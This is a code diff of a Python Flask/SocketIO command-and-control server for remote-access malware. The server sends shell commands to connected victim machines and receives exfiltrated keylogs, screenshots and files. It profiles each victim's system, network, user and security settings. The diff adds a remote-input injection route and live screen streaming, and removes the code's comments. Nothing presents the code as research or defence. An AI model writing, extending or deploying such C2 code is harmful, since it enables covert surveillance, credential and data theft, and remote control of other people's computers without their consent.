@@ -14,33 +14,26 @@ app.config['UPLOAD_FOLDER'] = 'uploads'
 app.config['DOWNLOAD_FOLDER'] = 'downloads'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-# Ensure directories exist
 for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
     if not os.path.exists(folder):
         os.makedirs(folder)
 
-# Track connected clients
 connected_clients = set()
-
-# Store client info and activity
 client_info = {}
 client_activity = {}
 
 def get_files():
-    """List all files in the upload folder."""
     upload_folder = app.config['UPLOAD_FOLDER']
     files = [f for f in os.listdir(upload_folder) if os.path.isfile(os.path.join(upload_folder, f))]
     return sorted(files)
 
 @app.route('/')
 def index():
-    """Render the main page with connected clients and uploaded files."""
     files = get_files()
     return render_template('index.html', clients=list(connected_clients), files=files)
 
 @app.route('/send_command', methods=['POST'])
 def send_command():
-    """Handle command submission from the web interface."""
     client_id = request.form.get('client_id')
     command = request.form.get('command')
 
@@ -51,9 +44,20 @@ def send_command():
     socketio.emit('command', command, to=client_id)
     return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})
 
+@app.route('/send_remote_input', methods=['POST'])
+def send_remote_input():
+    client_id = request.form.get('client_id')
+    input_data = request.form.get('input_data')
+
+    if not client_id or not input_data:
+        return jsonify({"status": "error", "message": "Missing client_id or input_data"}), 400
+
+    print(f"[*] Sending remote input to {client_id}: {input_data}")
+    socketio.emit('remote_input', json.loads(input_data), to=client_id)
+    return jsonify({"status": "success", "message": f"Remote input sent to {client_id}"})
+
 @app.route('/upload', methods=['POST'])
 def upload_file():
-    """Handle file upload from web interface to send to client."""
     if 'file' not in request.files:
         return jsonify({"status": "error", "message": "No file part"}), 400
     file = request.files['file']
@@ -71,12 +75,10 @@ def upload_file():
 
 @app.route('/download/<filename>')
 def download(filename):
-    """Serve files for clients to download."""
     return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)
 
 @app.route('/view_file/<filename>')
 def view_file(filename):
-    """Render a page to view the contents of an uploaded file."""
     filename = secure_filename(filename)
     file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
     if os.path.exists(file_path):
@@ -88,7 +90,6 @@ def view_file(filename):
 
 @socketio.on('connect')
 def handle_connect():
-    """Handle new client connections."""
     client_id = request.sid
     connected_clients.add(client_id)
     client_activity[client_id] = {"last_active": time.time(), "status": "active"}
@@ -97,7 +98,6 @@ def handle_connect():
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    """Handle client disconnections."""
     client_id = request.sid
     if client_id in connected_clients:
         connected_clients.remove(client_id)
@@ -108,16 +108,14 @@ def handle_disconnect():
 
 @socketio.on('exfil_data')
 def handle_exfil_data(data):
-    """Handle exfiltrated data from clients."""
     client_id = request.sid
     data = json.loads(data)
     data_type = data.get('type')
 
-    # Update activity status
     client_activity[client_id]["last_active"] = time.time()
     current_time = time.time()
     for cid, activity in client_activity.items():
-        if current_time - activity["last_active"] > 30:  # Idle after 30 seconds
+        if current_time - activity["last_active"] > 30:
             activity["status"] = "idle"
         else:
             activity["status"] = "active"
@@ -127,7 +125,16 @@ def handle_exfil_data(data):
         if not username:
             socketio.emit('command', 'whoami', to=client_id)
         else:
-            client_info[client_id] = data.get('system', {})
+            client_info[client_id] = {
+                "system": data.get('system', {}),
+                "hardware": data.get('hardware', {}),
+                "network": data.get('network', {}),
+                "user": data.get('user', {}),
+                "software": data.get('software', {}),
+                "environment": data.get('environment', {}),
+                "peripherals": data.get('peripherals', {}),
+                "security": data.get('security', {})
+            }
             client_info[client_id]['username'] = username
             client_info[client_id]['ip_addresses'] = data.get('network', {}).get('ip_addresses', [])
             client_info[client_id]['location'] = data.get('network', {}).get('location', 'Unknown')
@@ -191,6 +198,12 @@ def handle_exfil_data(data):
             'image': data.get('image')
         }, broadcast=True)
 
+    elif data_type == "screen_stream":
+        emit('screen_stream', {
+            'client_id': client_id,
+            'image': data.get('image')
+        }, broadcast=True)
+
     elif data_type == "keylog_data":
         emit('keylog_data', {
             'client_id': client_id,
@@ -205,13 +218,11 @@ def handle_exfil_data(data):
             f.write(file_data)
         print(f"[*] Received file {filename} from client {client_id}")
 
-    # Emit updated client info
     client_info_list = [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()]
     emit('client_info', client_info_list, broadcast=True)
 
 @socketio.on('request_client_info')
 def handle_request_client_info():
-    """Handle requests for client info from the web interface."""
     client_info_list = [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()]
     emit('client_info', client_info_list)
 
